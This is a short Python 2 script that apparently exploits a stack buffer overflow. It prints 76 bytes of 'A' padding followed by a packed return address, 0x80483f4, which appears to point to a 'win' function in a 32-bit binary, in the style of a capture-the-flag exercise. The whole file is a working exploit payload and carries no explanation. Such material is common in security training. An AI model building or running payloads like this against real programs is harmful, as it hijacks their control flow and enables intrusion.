#!/usr/bin/env python
import struct

padding = (0x54-0x41)*"AAAA"
win = struct.pack("<I", 0x80483f4)

print padding + win
